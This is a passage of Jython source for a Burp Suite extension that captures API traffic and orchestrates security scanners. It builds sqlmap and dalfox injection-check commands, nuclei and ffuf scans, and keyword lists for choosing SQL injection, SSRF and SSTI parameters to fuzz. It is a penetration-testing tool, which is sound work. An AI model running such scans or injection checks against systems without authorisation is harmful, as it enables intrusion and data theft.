# -*- coding: utf-8 -*-
# pylint: disable=import-error
import json
import re
import shlex
import threading
import time
import ai_prep_layer
import heavy_runners

from burp import IBurpExtender, IContextMenuFactory, IHttpListener, IProxyListener, ITab
from java.awt import BorderLayout, Color, Dimension, FlowLayout, Font, GridLayout
from java.awt.event import MouseAdapter
from java.io import File, FileWriter
from java.net import URL
from java.text import SimpleDateFormat
from java.util import ArrayList, Date
from javax.swing import (
    BorderFactory,
    Box,
    BoxLayout,
    DefaultListModel,
    JButton,
    JCheckBox,
    JComboBox,
    JFileChooser,
    JLabel,
    JList,
    JMenuItem,
    JOptionPane,
    JPanel,
    JPopupMenu,
    JScrollPane,
    JSplitPane,
    JTabbedPane,
    JTextArea,
    JTextField,
    ListCellRenderer,
    SwingUtilities,
    ToolTipManager,
)
from javax.swing.event import DocumentListener, ListSelectionListener


class SearchListener(DocumentListener):
    def __init__(self, extender, delay_ms=300):
        self.extender = extender
        self.timer = None
        self.delay_ms = delay_ms

    def insertUpdate(self, e):
        self._schedule()

    def removeUpdate(self, e):
        self._schedule()

    def changedUpdate(self, e):
        self._schedule()

    def _schedule(self):
        if self.timer:
            self.timer.cancel()
        self.timer = threading.Timer(
            self.delay_ms / 1000.0,
            lambda: SwingUtilities.invokeLater(self.extender.refresh_view),
        )
        self.timer.daemon = True
        self.timer.start()


class BurpExtender(
    IBurpExtender, ITab, IHttpListener, IProxyListener, IContextMenuFactory
):
    PARAM_URL = 0
    PARAM_BODY = 1
    PARAM_COOKIE = 2
    PARAM_JSON = 6
    AI_PREP_LAYER_ENV_VAR = "AI_PREP_LAYER"
    AI_PREP_LAYER_DEFAULT_ENABLED = True

    # Pre-compiled regex patterns for performance
    NUMERIC_ID_PATTERN = re.compile(r"/\d+")
    UUID_PATTERN = re.compile(
        r"/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        re.IGNORECASE
    )
    OBJECTID_PATTERN = re.compile(r"/[0-9a-f]{24}")
    BASE64_PATTERN = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
    HEX_PATTERN = re.compile(r"[0-9a-fA-F]{32,}")
    ANSI_ESCAPE_PATTERN = re.compile(r"\x1b\[[0-9;]*[mK]")
    PASSIVE_ADMIN_PATH_PATTERN = re.compile(
        r"/(admin|internal|manage|role|roles|permission|permissions|billing|finance|staff|config|debug)(/|$)",
        re.IGNORECASE,
    )
    PASSIVE_RESOURCE_PATH_PATTERN = re.compile(
        r"/(search|list|export|report|download|upload|bulk|import|sync|query|graphql|analytics|history)(/|$)",
        re.IGNORECASE,
    )
    PASSIVE_FLOW_PATH_PATTERN = re.compile(
        r"/(checkout|payment|payout|transfer|withdraw|redeem|coupon|order|purchase|refund|approve|mfa|verify|reset|invite|subscription|billing)(/|$)",
        re.IGNORECASE,
    )
    PASSIVE_WEBHOOK_PATH_PATTERN = re.compile(
        r"/(webhook|callback|integration|notify)(/|$)",
        re.IGNORECASE,
    )
    PASSIVE_VERSION_SEGMENT_PATTERN = re.compile(r"/(v\d+(?:\.\d+)?)(?=/|$)", re.IGNORECASE)
    PASSIVE_LIMIT_QUERY_PATTERN = re.compile(
        r"(?:^|&)(?:limit|page_size|pagesize|max|size)=([0-9]{1,7})(?:&|$)",
        re.IGNORECASE,
    )
    PASSIVE_CALLBACK_PARAM_KEYWORDS = (
        "url",
        "uri",
        "link",
        "target",
        "dest",
        "destination",
        "callback",
        "redirect",
        "return",
        "next",
        "webhook",
        "endpoint",
        "proxy",
        "source",
        "image",
        "avatar",
        "file",
    )
    PASSIVE_SIGNATURE_HEADER_HINTS = (
        "x-signature",
        "x-hub-signature",
        "x-hub-signature-256",
        "stripe-signature",
        "x-webhook-signature",
        "x-slack-signature",
        "x-twilio-signature",
    )
    PASSIVE_UPSTREAM_ERROR_HINTS = (
        "upstream",
        "econnrefused",
        "etimedout",
        "timed out",
        "connection refused",
        "socket hang up",
        "certificate verify failed",
        "unable to resolve host",
        "dns",
    )
    PASSIVE_SENSITIVE_FIELD_KEYWORDS = (
        "ssn",
        "social",
        "dob",
        "birth",
        "salary",
        "wage",
        "tax",
        "passport",
        "national",
        "identity",
        "iban",
        "bank",
        "account",
        "credit",
        "card",
        "cvv",
        "email",
        "phone",
        "address",
        "location",
        "token",
        "secret",
        "password",
    )
    PASSIVE_STATIC_EXTENSIONS = (
        ".js",
        ".mjs",
        ".css",
        ".map",
        ".png",
        ".jpg",
        ".jpeg",
        ".gif",
        ".webp",
        ".svg",
        ".ico",
        ".woff",
        ".woff2",
        ".ttf",
        ".eot",
        ".otf",
        ".mp4",
        ".webm",
        ".avi",
        ".mov",
        ".pdf",
    )
    PASSIVE_STATIC_PATH_PARTS = (
        "js",
        "css",
        "static",
        "dist",
        "assets",
        "images",
        "img",
        "fonts",
        "sdk",
        "library",
        "safeframe",
        "gtag",
        "gtm",
        "pagead",
        "analytics",
        "ads",
        "sodar",
        "prebid",
        "rtv",
    )
    PASSIVE_API_PATTERN_HINTS = (
        "rest api",
        "graphql",
        "json api",
        "xml api",
    )
    FUZZER_STATIC_PATH_PARTS = PASSIVE_STATIC_PATH_PARTS + (
        "xjs",
        "pixels",
        "pixel",
        "sync",
        "usersync",
        "user-sync",
        "cookie-sync",
        "cookie_sync",
        "rmkt",
        "tr",
        "ac",
    )
    FUZZER_STRICT_NOISE_PATH_MARKERS = (
        "/cdn-cgi",
        "/__cf_chl_",
        "/captcha",
        "/recaptcha",
        "/sodar",
        "/_/js",
        "/_/tvty",
    )
    FUZZER_SQLI_PARAM_KEYWORDS = (
        "id",
        "user",
        "account",
        "email",
        "name",
        "search",
        "query",
        "q",
        "filter",
        "sort",
        "order",
        "where",
        "page",
        "limit",
        "offset",
    )
    FUZZER_SSRF_PARAM_KEYWORDS = (
        "url",
        "uri",
        "dest",
        "destination",
        "target",
        "redirect",
        "endpoint",
        "webhook",
        "proxy",
        "image",
        "file",
        "download",
        "fetch",
        "callback_url",
    )
    FUZZER_SSTI_PARAM_KEYWORDS = (
        "template",
        "tpl",
        "view",
        "render",
        "content",
        "message",
        "body",
        "subject",
        "html",
        "markdown",
        "text",
    )
    PARAM_MINER_NOISE_PATH_MARKERS = (
        "/openrtb",
        "/prebid",
        "/bidder",
        "/header-bidding",
        "/cookie-sync",
        "/cookie_sync",
        "/usersync",
        "/user-sync",
        "/pixel",
        "/collect",
        "/rum",
        "/sodar",
        "/pagead",
        "/adserver",
        "/sync",
    )
    PARAM_MINER_STRICT_NOISE_PATH_MARKERS = (
        "/cdn-cgi",
        "/__cf_chl_",
        "/captcha",
        "/recaptcha",
        "/sodar",
    )
    VERSION_SCANNER_NOISE_PATH_MARKERS = (
        "/cdn-cgi",
        "/__cf_chl_",
        "/captcha",
        "/recaptcha",
        "/sodar",
    )
    FFUF_NOISE_HOST_PATTERNS = (
        "google.com",
        "doubleclick.net",
        "googlesyndication.com",
        "google-analytics.com",
        "googleusercontent.com",
        "gstatic.com",
        "recaptcha.net",
        "facebook.com",
        "fbcdn.net",
        "twitter.com",
        "x.com",
        "linkedin.com",
        "cdn.",
        "cloudfront.net",
        "fastly.net",
        "akamai",
        "sentry.io",
        "segment.io",
        "datadog",
        "newrelic",
        "dailymotion.com",
        "dmcdn.net",
        "instagram.com",
        "cdninstagram.com",
        "youtube.com",
        "ytimg.com",
        "vimeo.com",
        "tiktok.com",
        "tiktokcdn.com",
    )
    WAYBACK_NOISE_HOST_PATTERNS = (
        "doubleclick.net",
        "googlesyndication.com",
        "googleadservices.com",
        "googletagmanager.com",
        "adnxs.com",
        "rubiconproject.com",
        "pubmatic.com",
        "outbrain.com",
        "criteo.com",
        "openx.net",
        "teads.tv",
        "smartadserver.com",
        "everesttech.net",
        "rfihub.com",
        "sharethis.com",
        "adform.net",
        "taboola.com",
        "bidswitch.net",
        "demdex.net",
        "casalemedia.com",
        "zemanta.com",
        "connatix.com",
        "id5-sync.com",
        "adscale.de",
        "semasio.net",
        "servenobid.com",
        "pbstck.com",
        "mediarithmics.com",
        "seedtag.com",
        "audion.fm",
        "aps.amazon-adsystem.com",
        "amazon-adsystem.com",
        "scorecardresearch.com",
        "adsrvr.org",
    )
    WAYBACK_NOISE_LABELS = (
        "ad",
        "ads",
        "sync",
        "pixel",
        "tracker",
        "tracking",
        "analytics",
        "metric",
        "metrics",
        "telemetry",
        "beacon",
        "tag",
        "tags",
        "prebid",
        "bid",
    )
    FFUF_NOISE_PATH_PARTS = (
        "pagead",
        "ads",
        "adservice",
        "analytics",
        "collect",
        "pixel",
        "beacon",
        "telemetry",
        "track",
        "gtm",
        "tag",
    )
    FFUF_MAX_TARGETS = 120
    FFUF_THREADS = 16
    FFUF_REQUEST_TIMEOUT_SECONDS = 8
    FFUF_RATE_LIMIT = 35
    FFUF_TARGET_TIMEOUT_SECONDS = 45
    NUCLEI_MAX_TARGETS = 800
    NUCLEI_REQUEST_TIMEOUT_SECONDS = 8
    NUCLEI_RETRIES = 1
    NUCLEI_RATE_LIMIT = 100
    NUCLEI_CONCURRENCY = 20
    NUCLEI_BULK_SIZE = 8
    NUCLEI_MAX_HOST_ERROR = 8
    NUCLEI_SCAN_STRATEGY = "host-spray"
    NUCLEI_MAX_SCAN_SECONDS = 900
    KATANA_MAX_TARGETS = 40
    WAYBACK_MAX_QUERIES = 160

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("API Security Suite")

        self.api_data = {}
        self.endpoint_tags = {}
        self.endpoint_times = {}
        self.lock = threading.Lock()
        self.max_endpoints = 800
        self.max_body_size = 5000
        self._tool_help_cache = {}
        self.target_base_scope_lines = []
        self.target_base_scope_hosts = set()
        self.target_base_scope_bases = set()
        self.target_base_scope_only_enabled = False
        self.target_scope_checkboxes = []
        self._syncing_target_scope_checkboxes = False
        self._tool_process_lock = threading.Lock()
        self._active_tool_processes = {}
        self._tool_cancel_flags = {
            "nuclei": threading.Event(),
            "httpx": threading.Event(),
            "katana": threading.Event(),
            "ffuf": threading.Event(),
            "wayback": threading.Event(),
            "authreplay": threading.Event(),
            "sqlmap": threading.Event(),
            "dalfox": threading.Event(),
            "assetdiscovery": threading.Event(),
            "openapidrift": threading.Event(),
            "graphqlanalysis": threading.Event(),
        }
        self.passive_discovery_findings = []
        self.passive_discovery_lock = threading.Lock()
        self._capture_ui_refresh_timer = None
        self._capture_ui_refresh_last_ts = 0.0
        self._capture_ui_refresh_min_interval_ms = 250

        # Pagination state
        self.current_page = 0
        self.page_size = 100
        self.total_pages = 0

        self._panel = JPanel(BorderLayout())
        self._panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        # Create tabbed pane
        self.tabbed_pane = JTabbedPane()
        self._configure_tooltips()

        # Recon tab
        recon_panel = JPanel(BorderLayout())
        top_panel = JPanel()
        top_panel.setLayout(GridLayout(2, 1))

        # Statistics panel
        stats_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        stats_panel.setBorder(BorderFactory.createTitledBorder("Statistics"))
        self.stats_label = JLabel(
            "Endpoints: 0 | Critical: 0 | High: 0 | Medium: 0 | Hosts: 0"
        )
        self.stats_label.setFont(Font("Monospaced", Font.BOLD, 12))
        stats_panel.add(self.stats_label)

        controls_row = JPanel(FlowLayout(FlowLayout.LEFT))
        self.auto_capture = JCheckBox("Auto-Capture", True)
        controls_row.add(self.auto_capture)
        samples_label = JLabel("Samples:")
        samples_label.setToolTipText("Max samples to capture per unique endpoint")
        controls_row.add(samples_label)
        self.sample_limit = JComboBox(["1", "3", "5", "10"])
        self.sample_limit.setSelectedItem("3")
        self.sample_limit.setToolTipText(
            "Number of request/response samples to collect per endpoint (e.g., GET:/api/users/{id})"
        )
        controls_row.add(self.sample_limit)

        # Pagination controls
        controls_row.add(JLabel(" | Page:"))
        self.page_label = JLabel("1/1")
        controls_row.add(self.page_label)
        self.prev_page_btn = JButton("<")
        self.prev_page_btn.addActionListener(lambda e: self._prev_page())
        controls_row.add(self.prev_page_btn)
        self.next_page_btn = JButton(">")
        self.next_page_btn.addActionListener(lambda e: self._next_page())
        controls_row.add(self.next_page_btn)
        page_size_label = JLabel("Per page:")
        controls_row.add(page_size_label)
        self.page_size_combo = JComboBox(["50", "100", "200", "500"])
        self.page_size_combo.setSelectedItem("100")
        self.page_size_combo.addActionListener(lambda e: self._change_page_size())
        controls_row.add(self.page_size_combo)

        filter_row = JPanel(FlowLayout(FlowLayout.LEFT))
        filter_row.add(JLabel("Search:"))
        self.search_field = JTextField(15)
        self.search_field.getDocument().addDocumentListener(SearchListener(self))
        filter_row.add(self.search_field)
        filter_row.add(JLabel("Host:"))
        self.host_filter = JComboBox(["All"])
        self.host_filter.addActionListener(lambda e: self._on_filter_change())
        filter_row.add(self.host_filter)
        filter_row.add(JLabel("Method:"))
        self.method_filter = JComboBox(
            ["All", "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
        )
        self.method_filter.addActionListener(lambda e: self._on_filter_change())
        filter_row.add(self.method_filter)
        filter_row.add(JLabel("Severity:"))
        self.severity_filter = JComboBox(["All", "Critical", "High", "Medium", "Info"])
        self.severity_filter.addActionListener(lambda e: self._on_filter_change())
        filter_row.add(self.severity_filter)
        filter_row.add(JLabel("Group:"))
        self.group_by = JComboBox(["None", "Host", "Method", "Auth", "Encryption"])
        self.group_by.addActionListener(lambda e: self._on_group_change())
        filter_row.add(self.group_by)

        top_panel.add(stats_panel)
        top_panel.add(controls_row)
        top_panel.add(filter_row)
        recon_panel.add(top_panel, BorderLayout.NORTH)

        self.list_model = DefaultListModel()
        self.endpoint_list = JList(self.list_model)
        self.endpoint_list.setFont(Font("Monospaced", Font.PLAIN, 12))
        self.endpoint_list.setCellRenderer(EndpointRenderer(self))
        self.endpoint_list.addMouseListener(EndpointClickListener(self))
        self.endpoint_list.addListSelectionListener(EndpointSelectionListener(self))
        endpoint_scroll = JScrollPane(self.endpoint_list)
        endpoint_scroll.setBorder(
            BorderFactory.createTitledBorder("Captured API Endpoints")
        )

        # Details panel
        self.details_area = JTextArea()
        self.details_area.setEditable(False)
        self.details_area.setFont(Font("Monospaced", Font.PLAIN, 11))
        details_scroll = JScrollPane(self.details_area)
        details_scroll.setBorder(BorderFactory.createTitledBorder("Endpoint Details"))

        self.log_area = JTextArea(8, 80)
        self.log_area.setEditable(False)
        self.log_area.setFont(Font("Monospaced", Font.PLAIN, 11))
        log_scroll = JScrollPane(self.log_area)
        log_scroll.setBorder(BorderFactory.createTitledBorder("Activity Log"))

        main_split = JSplitPane(
            JSplitPane.HORIZONTAL_SPLIT, endpoint_scroll, details_scroll
        )
        main_split.setResizeWeight(0.5)

        bottom_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, main_split, log_scroll)
        bottom_split.setResizeWeight(0.7)
        recon_panel.add(bottom_split, BorderLayout.CENTER)

        btn_panel = JPanel(GridLayout(1, 0, 5, 5))

        export_btn = JButton("Export All")
        export_btn.setBackground(Color(40, 167, 69))
        export_btn.setForeground(Color.WHITE)
        export_btn.addActionListener(lambda e: self.export_api_data())

        export_host_btn = JButton("Export Host")
        export_host_btn.setBackground(Color(23, 162, 184))
        export_host_btn.setForeground(Color.WHITE)
        export_host_btn.addActionListener(lambda e: self.export_by_host())

        ai_export_btn = JButton("Export AI Bundle")
        ai_export_btn.setBackground(Color(138, 43, 226))
        ai_export_btn.setForeground(Color.WHITE)
        ai_export_btn.addActionListener(lambda e: self._export_ai_context())

        import_btn = JButton("Import")
        import_btn.setBackground(Color(0, 123, 255))
        import_btn.setForeground(Color.WHITE)
        import_btn.addActionListener(lambda e: self.import_data())

        postman_btn = JButton("Postman")
        postman_btn.setBackground(Color(255, 140, 0))
        postman_btn.setForeground(Color.WHITE)
        postman_btn.addActionListener(lambda e: self._export_postman_collection())

        insomnia_btn = JButton("Insomnia")
        insomnia_btn.setBackground(Color(111, 66, 193))
        insomnia_btn.setForeground(Color.WHITE)
        insomnia_btn.addActionListener(lambda e: self._export_insomnia_collection())

        tool_health_btn = JButton("Tool Health")
        tool_health_btn.setBackground(Color(32, 201, 151))
        tool_health_btn.setForeground(Color.WHITE)
        tool_health_btn.addActionListener(lambda e: self._run_tool_health_check(e))

        help_btn = JButton("Button Help")
        help_btn.setBackground(Color(108, 117, 125))
        help_btn.setForeground(Color.WHITE)
        help_btn.addActionListener(lambda e: self._show_recon_button_help(e))

        clear_btn = JButton("Clear Data")
        clear_btn.setBackground(Color(220, 53, 69))
        clear_btn.setForeground(Color.WHITE)
        clear_btn.addActionListener(lambda e: self.clear_data())

        refresh_btn = JButton("Refresh")
        refresh_btn.setBackground(Color(108, 117, 125))
        refresh_btn.setForeground(Color.WHITE)
        refresh_btn.addActionListener(lambda e: self.refresh_view())
        self._apply_component_tooltips(
            {
                export_btn: "Export all captured Recon endpoints and analysis to a JSON file",
                export_host_btn: "Export only endpoints for the selected host filter",
                ai_export_btn: "Export all-tab AI context bundle (Recon, scanners, findings, and LLM-ready files)",
                import_btn: "Import previously exported Recon JSON data",
                postman_btn: "Export scoped endpoints as a Postman Collection v2.1 file",
                insomnia_btn: "Export scoped endpoints as an Insomnia import JSON file",
                tool_health_btn: "Run local CLI compatibility checks for integrated external tools",
                help_btn: "Show what each Recon button does",
                clear_btn: "Clear all captured Recon data and reset views",
                refresh_btn: "Refresh endpoint list, stats, and details view",
            }
        )

        btn_panel.add(export_btn)
        btn_panel.add(export_host_btn)
        btn_panel.add(ai_export_btn)
        btn_panel.add(import_btn)
        btn_panel.add(postman_btn)
        btn_panel.add(insomnia_btn)
        btn_panel.add(tool_health_btn)
        btn_panel.add(help_btn)
        btn_panel.add(clear_btn)
        btn_panel.add(refresh_btn)

        recon_panel.add(btn_panel, BorderLayout.SOUTH)

        # Diff tab
        diff_panel = self._create_diff_tab()

        # Version Scanner tab
        version_panel = self._create_version_tab()

        # Param Miner tab
        param_panel = self._create_param_tab()

        # Fuzzer tab
        fuzzer_panel = self._create_fuzzer_tab()

        # SQLMap tab
        sqlmap_verify_panel = self._create_sqlmap_verify_tab()

        # Dalfox tab
        dalfox_verify_panel = self._create_dalfox_verify_tab()

        # Subfinder tab
        asset_discovery_panel = self._create_api_asset_discovery_tab()

        # OpenAPI Drift tab
        openapi_drift_panel = self._create_openapi_drift_tab()

        # Auth Replay tab
        auth_replay_panel = self._create_auth_replay_tab()

        # Passive Discovery tab
        passive_discovery_panel = self._create_passive_discovery_tab()

        # Nuclei tab
        nuclei_panel = self._create_nuclei_tab()

        # HTTPX tab
        httpx_panel = self._create_httpx_tab()

        # Katana tab
        katana_panel = self._create_katana_tab()

        # FFUF tab
        ffuf_panel = self._create_ffuf_tab()

        # Wayback tab
        wayback_panel = self._create_wayback_tab()

        # GraphQL tab
        graphql_panel = self._create_graphql_tab()

        # Add tabs
        # Internal workflow tabs first
        self.tabbed_pane.addTab("Recon", recon_panel)
        self.tabbed_pane.addTab("Diff", diff_panel)
        self.tabbed_pane.addTab("Version Scanner", version_panel)
        self.tabbed_pane.addTab("Param Miner", param_panel)
        self.tabbed_pane.addTab("Fuzzer", fuzzer_panel)
        self.tabbed_pane.addTab("Auth Replay", auth_replay_panel)
        self.tabbed_pane.addTab("Passive Discovery", passive_discovery_panel)

        # External scanner/tool tabs last (requested order)
        self.tabbed_pane.addTab("Nuclei", nuclei_panel)
        self.tabbed_pane.addTab("HTTPX", httpx_panel)
        self.tabbed_pane.addTab("Katana", katana_panel)
        self.tabbed_pane.addTab("FFUF", ffuf_panel)
        self.tabbed_pane.addTab("Wayback", wayback_panel)
        self.tabbed_pane.addTab("Sqlmap", sqlmap_verify_panel)
        self.tabbed_pane.addTab("Dalfox", dalfox_verify_panel)
        self.tabbed_pane.addTab("Subfinder", asset_discovery_panel)
        self.tabbed_pane.addTab("OpenAPI Drift", openapi_drift_panel)
        self.tabbed_pane.addTab("GraphQL", graphql_panel)

        self._panel.add(self.tabbed_pane, BorderLayout.CENTER)

        # Initialize output directory for external tools
        import os

        self.output_dir = os.path.join(os.path.expanduser("~"), "burp_APIRecon")
        if not os.path.exists(self.output_dir):
            try:
                os.makedirs(self.output_dir)
            except Exception as e:
                self._callbacks.printError(
                    "Failed to create output directory: {}".format(str(e))
                )

        callbacks.registerHttpListener(self)
        callbacks.registerProxyListener(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.addSuiteTab(self)

        self.log_to_ui("[+] API Security Suite loaded - Capturing API traffic...")

    def _create_action_button(self, text, color, action, tooltip=None):
        """Helper to create styled action button"""
        btn = JButton(text)
        btn.setBackground(color)
        btn.setForeground(Color.WHITE)
        btn.addActionListener(action)
        self._set_component_tooltip(
            btn, self._resolve_action_button_tooltip(text, tooltip)
        )
        return btn

    def _resolve_action_button_tooltip(self, text, explicit_tooltip=None):
        """Generate consistent tooltips for tab action buttons."""
        if explicit_tooltip is not None:
            return explicit_tooltip

        label = self._ascii_safe(text or "").strip()
        if not label:
            return None

        normalized = label.rstrip(".").strip()
        lower_label = self._ascii_safe(normalized, lower=True).strip()
        direct_map = {
            "target bases": "Open scope editor for base URLs/hosts used by external scanners",
            "pkill tools": "Emergency stop for all external scanner processes launched by this extension",
            "copy": "Copy this tab output text to your system clipboard for AI/reports",
            "copy as curl": "Copy selected/generated attack request as a reusable curl command",
            "clear": "Clear this tab output panel only (does not delete Recon capture data)",
            "compare": "Compare two exported Recon snapshots and list added/removed endpoints",
            "standard": "Load standard version tokens preset into the Versions input field",
            "decimal": "Load decimal version format preset (for example v1.0, v2.1)",
            "environments": "Load environment keyword preset (dev, test, staging, prod)",
            "legacy": "Load legacy/deprecated version keyword preset into input field",
            "all": "Load combined full preset list into this tab input field",
            "admin": "Load admin-privilege parameter keyword preset into Params input",
            "debug": "Load debug/verbose parameter keyword preset into Params input",
            "access": "Load access-control/secret parameter keyword preset into Params input",
            "callback": "Load callback/redirect URL parameter keyword preset into Params input",
            "generate": "Generate fuzz payload candidates from Recon endpoints and selected attack type",
            "send to intruder": "Send generated requests/targets to Burp Intruder for manual exploitation",
            "export payloads": "Export generated fuzz payloads from this tab to disk",
            "turbo intruder": "Export a Turbo Intruder-ready script/payload package from current attacks",
            "run verify": "Run verifier against ranked candidates and keep evidence in this tab output",
            "send to recon": "Import verified/discovered results into Recon endpoint inventory",
            "show targets": "Preview target list that this tab will process before launching scans",
            "run subfinder": "Run Subfinder on selected domains and collect discovered asset hosts",
            "browse": "Browse local filesystem and select OpenAPI specification file",
            "detect": "Auto-detect likely OpenAPI spec endpoints from captured traffic history",
            "run drift": "Compare observed traffic against OpenAPI spec to identify drift/missing coverage",
            "run replay": "Replay requests across auth profiles (guest/user/admin) for auth gap checks",
            "extract": "Extract header value from captured traffic into the selected auth profile field",
            "run passive": "Analyze captured traffic only (no active requests) for API risk patterns",
            "export": "Export this tab findings to a timestamped file in the project export folder",
            "run nuclei": "Launch Nuclei with current profile/scope and parse findings back into this tab",
            "export targets": "Export current scoped target URLs prepared for Nuclei execution",
            "probe endpoints": "Run HTTPX on scoped URLs to capture status/title/tech probe output",
            "export urls": "Export probed/reachable URLs from this tab for reuse in other tools",
            "crawl endpoints": "Run Katana crawl on scoped targets to discover additional API paths",
            "export discovered": "Export URLs/endpoints discovered by crawler or passive sources",
            "fuzz directories": "Run FFUF directory/content discovery against scoped API hosts",
            "discover": "Query historical URL sources (Wayback/gau) for archived endpoint paths",
            "run analysis": "Run GraphQL-focused multi-tool workflow and aggregate findings in this tab",
            "scan versions": "Probe version/path variants from input list against captured API base paths",
            "export results": "Export findings shown in this tab to a structured text/JSON artifact",
            "mine params": "Mine parameter candidates from Recon endpoints and rank by operation risk",
        }
        if lower_label in direct_map:
            return direct_map[lower_label]

        if lower_label.startswith("run "):
            return "Run {} using current tab settings and scoped targets".format(
                normalized[4:].strip()
            )
        if lower_label.startswith("stop "):
            return "Stop {} process currently running for this tab".format(
                normalized[5:].strip()
            )
        if lower_label.startswith("export "):
            return "Export {} data from this tab to a file".format(normalized[7:].strip())
        if lower_label.startswith("import "):
            return "Import data for {} workflow".format(normalized[7:].strip())
        if lower_label.startswith("send "):
            return "Send selected {} output to the downstream workflow target".format(
                normalized[5:].strip()
            )
        if lower_label.startswith("clear "):
            return "Clear {} data shown in this tab".format(normalized[6:].strip())
        if lower_label.startswith("refresh "):
            return "Refresh {} view with latest in-memory data".format(
                normalized[8:].strip()
            )
        if lower_label.startswith("open "):
            return "Open {} helper dialog".format(normalized[5:].strip())
        if lower_label.startswith("save "):
            return "Save {} configuration to disk".format(normalized[5:].strip())
        if lower_label.startswith("load "):
            return "Load {} configuration from disk".format(normalized[5:].strip())
        if lower_label.startswith("detect "):
            return "Detect {} from captured traffic and tab settings".format(
                normalized[7:].strip()
            )
        if lower_label.startswith("analyze "):
            return "Analyze {} with current tab options".format(normalized[8:].strip())

        return "Run '{}' using current tab context and controls".format(normalized)

    def _set_component_tooltip(self, component, text):
        """Apply tooltip text with a single conversion path."""
        if component is None:
            return
        if text is None:
            component.setToolTipText(None)
            return
        try:
            text_type = unicode  # noqa: F821 (Python2/Jython)
        except NameError:
            text_type = str
        tooltip_text = text if isinstance(text, text_type) else text_type(text)
        tooltip_text = tooltip_text.strip()
        component.setToolTipText(tooltip_text if tooltip_text else None)

    def _apply_component_tooltips(self, component_tooltips):
        """Apply tooltip text across multiple components."""
        if not isinstance(component_tooltips, dict):
            return
        for component, text in component_tooltips.items():
            self._set_component_tooltip(component, text)

    def _configure_tooltips(self):
        """Use one deterministic tooltip policy for all tabs."""
        manager = ToolTipManager.sharedInstance()
        manager.setEnabled(True)
        manager.setInitialDelay(350)
        manager.setReshowDelay(100)
        manager.setDismissDelay(20000)

    def _normalize_profile(self, profile_value):
        """Normalize profile name to fast/balanced/deep."""
        raw = self._ascii_safe(profile_value, lower=True).strip()
        if raw in ["fast", "quick", "speed"]:
            return "fast"
        if raw in ["deep", "thorough", "max", "maximum"]:
            return "deep"
        return "balanced"

    def _profile_labels(self):
        """Return shared profile labels used by scanner tuning controls."""
        return ["Fast", "Balanced", "Deep"]

    def _selected_profile_value(self, combo):
        """Normalize selected profile label to helper profile key."""
        raw_value = self._ascii_safe(str(combo.getSelectedItem()) if combo else "")
        return self._normalize_profile(raw_value)

    def _sqlmap_profile_settings(self, profile_value):
        """Return SQLMap tuning values for selected profile."""
        profile = self._normalize_profile(profile_value)
        if profile == "fast":
            return {
                "profile": profile,
                "level": "1",
                "risk": "1",
                "threads": "1",
                "sql_timeout": "6",
                "retries": "0",
            }
        if profile == "deep":
            return {
                "profile": profile,
                "level": "3",
                "risk": "2",
                "threads": "2",
                "sql_timeout": "12",
                "retries": "2",
            }
        return {
            "profile": "balanced",
            "level": "2",
            "risk": "1",
            "threads": "1",
            "sql_timeout": "8",
            "retries": "1",
        }

    def _build_sqlmap_command(self, sqlmap_path, target, profile_value):
        """Build SQLMap command for one verification target."""
        cfg = self._sqlmap_profile_settings(profile_value)
        cmd = [
            sqlmap_path,
            "-u",
            target.get("url", ""),
            "--batch",
            "--level",
            cfg["level"],
            "--risk",
            cfg["risk"],
            "--threads",
            cfg["threads"],
            "--timeout",
            cfg["sql_timeout"],
            "--retries",
            cfg["retries"],
            "--flush-session",
        ]

        params = target.get("params", []) or []
        if params:
            cmd.extend(["-p", ",".join(params[:6])])

        method = (target.get("method") or "GET").upper()
        data = target.get("data") or ""
        if method in ["POST", "PUT", "PATCH", "DELETE"] and data:
            cmd.extend(["--method", method, "--data", data[:1200]])
        return cmd, cfg

    def _dalfox_profile_settings(self, profile_value):
        """Return Dalfox tuning values for selected profile."""
        profile = self._normalize_profile(profile_value)
        if profile == "fast":
            return {
                "profile": profile,
                "timeout": "6",
                "worker": "20",
                "skip_mining": True,
            }
        if profile == "deep":
            return {
                "profile": profile,
                "timeout": "12",
                "worker": "50",
                "skip_mining": False,
            }
        return {
            "profile": "balanced",
            "timeout": "8",
            "worker": "30",
            "skip_mining": True,
        }

    def _build_dalfox_command(self, dalfox_path, target, out_file, profile_value):
        """Build Dalfox command for one verification target."""
        cfg = self._dalfox_profile_settings(profile_value)
        cmd = [
            dalfox_path,
            "url",
            target.get("url", ""),
            "--format",
            "jsonl",
            "-o",
            out_file,
            "-S",
            "--no-color",
            "--timeout",
            cfg["timeout"],
            "--worker",
            cfg["worker"],
        ]
        if cfg["skip_mining"]:
            cmd.extend(
                ["--skip-bav", "--skip-mining-all", "--skip-mining-dom", "--skip-headless"]
            )

        for param in (target.get("params", []) or [])[:4]:
            cmd.extend(["-p", param])

        method = (target.get("method") or "GET").upper()
        data = target.get("data") or ""
        if method in ["POST", "PUT", "PATCH", "DELETE"] and data:
            cmd.extend(["-X", method, "-d", data[:1200]])
        return cmd, cfg

    def _asset_profile_settings(self, profile_value):
        """Return API asset discovery stage tuning."""
        profile = self._normalize_profile(profile_value)
        if profile == "fast":
            return {
                "profile": profile,
                "subfinder_timeout": 150,
            }
        if profile == "deep":
            return {
                "profile": profile,
                "subfinder_timeout": 360,
            }
        return {
            "profile": "balanced",
            "subfinder_timeout": 240,
        }

    def _nuclei_profile_settings(self, profile_value):
        """Return Nuclei tuning values for selected profile."""
        profile = self._normalize_profile(profile_value)
        if profile == "fast":
            return {
                "profile": profile,
                # Keep fast profile tightly focused on API surface discovery.
                "include_tags": "swagger,openapi,graphql",
                "exclude_tags": "dos,intrusive,headless,cve,fuzz,fuzzing,brute-force",
                "request_timeout": 6,
                "retries": 0,
                "rate_limit": 50,
                "concurrency": 10,
                "bulk_size": 6,
                "max_host_error": 10,
                "scan_strategy": "host-spray",
                "max_scan_seconds": 300,
            }
        if profile == "deep":
            return {
                "profile": profile,
                # Deep profile adds config checks while staying API-centric.
                "include_tags": "swagger,openapi,graphql,auth,jwt,config",
